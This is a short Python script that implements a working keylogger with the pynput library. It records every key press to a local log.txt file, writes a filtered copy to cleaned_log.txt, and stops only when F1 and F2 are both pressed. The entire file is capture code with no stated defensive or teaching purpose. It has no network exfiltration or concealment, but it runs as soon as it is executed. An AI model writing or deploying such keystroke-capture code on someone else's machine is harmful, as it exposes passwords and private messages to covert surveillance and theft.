import pynput.keyboard
import re

class KeyLogger:
    def __init__(self):
        self.logger = ""
        self.f1_pressed = False
        self.f2_pressed = False
        self.listener = None

    def append_to_log(self, key_strike):
        self.logger += key_strike
        with open("log.txt", "a+", encoding="utf-8") as new_file:
            new_file.write(self.logger)
        self.logger = ""
        self.clean_log("log.txt")

    def evaluate_keys(self, key):
        if key == pynput.keyboard.Key.f1:
            self.f1_pressed = True
        elif key == pynput.keyboard.Key.f2:
            self.f2_pressed = True

        try:
            pressed_key = str(key.char)
        except AttributeError:
            if key == pynput.keyboard.Key.space:
                pressed_key = " "
            elif key == pynput.keyboard.Key.enter:
                pressed_key = "\n"
            else:
                pressed_key = " " + str(key) + " "

        self.append_to_log(pressed_key)

        if self.f1_pressed and self.f2_pressed:
            # Stop listener
            if self.listener:
                self.listener.stop()
            return False  # Return False to stop the listener

    def clean_log(self, file_path):
        with open(file_path, 'r') as file:
            data = file.read()
        
        # Removing the specified key strokes from the log
        cleaned_data = re.sub(r'Key\.\w+\s*', '', data)
        
        # Saving the cleaned log to a new file
        with open('cleaned_log.txt', 'w') as file:
            file.write(cleaned_data)

    def start(self):
        self.listener = pynput.keyboard.Listener(on_press=self.evaluate_keys)
        with self.listener:
            self.listener.join()

KeyLogger().start()
